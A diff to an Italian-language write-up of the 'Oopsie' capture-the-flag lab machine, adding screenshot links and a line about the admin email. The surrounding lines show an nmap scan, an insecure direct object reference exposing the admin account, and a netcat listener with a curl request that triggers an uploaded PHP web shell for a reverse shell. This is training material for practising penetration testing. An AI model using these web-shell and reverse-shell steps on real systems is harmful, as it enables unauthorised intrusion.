@@ -37,6 +37,10 @@ sudo nmap -sV -sC -p- Oopsie
 |22|SSH|OpenSSH 7.6p1|
 |80|HTTP|Apache 2.4.29|
 
+Esplorando il sito si trova l'email dell'admin in fondo alla homepage:
+
+![[Pasted image 20260409203228.png]]
+
 ---
 
 ## 2. Web Exploitation
@@ -48,6 +52,8 @@ Trovato nel sorgente della homepage:
 ```
 http://oopsie/cdn-cgi/login/
 ```
+
+![[Pasted image 20260409204807.png]]
 
 Login come **guest** → cookie di sessione esposti:
 
@@ -61,6 +67,8 @@ Navigando con `id=1` si vede l'account admin:
 ```
 http://oopsie/cdn-cgi/login/admin.php?content=accounts&id=1
 ```
+
+![[Pasted image 20260409205544.png]]
 
 - **Access ID admin:** `34322`
 - **Email:** `admin@megacorp.com`
@@ -103,6 +111,8 @@ nc -lvnp 4444
 # terminale 2 — dopo aver caricato shell.php dal pannello admin
 curl http://Oopsie/uploads/shell.php
 ```
+
+![[Pasted image 20260409211718.png]]
 
 Shell ottenuta come `www-data` (uid=33).
 
